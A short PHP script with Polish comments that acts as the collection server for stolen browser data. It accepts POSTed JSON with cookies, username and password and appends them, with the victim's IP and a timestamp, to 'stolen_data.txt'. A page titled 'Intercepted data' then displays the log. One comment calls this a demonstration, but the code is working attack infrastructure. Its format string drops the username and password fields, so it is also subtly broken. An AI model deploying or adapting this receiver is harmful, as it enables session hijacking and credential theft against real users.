<?php
session_start(); // Rozpoczęcie sesji

// Sprawdzenie, czy skrypt został wywołany metodą POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Odbieranie danych JSON
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);

    // Zapisywanie danych do pliku
    if (!empty($data)) {
        $logEntry = sprintf(
            "Time: %s, IP: %s, Cookies: %s\n",
            date("Y-m-d H:i:s"),
            $_SERVER['REMOTE_ADDR'], // Pobranie adresu IP użytkownika
            $data['cookies'],
            $data['username'],
            $data['password']
        );
        file_put_contents('stolen_data.txt', $logEntry, FILE_APPEND);
    }

    echo json_encode(array('status' => 'success', 'message' => 'Dane zostały odebrane.'));
    exit; // Zakończenie skryptu
}

// Wczytywanie zapisanych danych (tylko dla demonstracji, w prawdziwej aplikacji powinno być to zabezpieczone)
$stolenData = file_get_contents('stolen_data.txt');
?>

<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Przechwycone Dane</title>    
</head>
<body>
    <h1>Przechwycone dane</h1>
    <pre><?php echo htmlspecialchars($stolenData); ?></pre>
</body>
</html>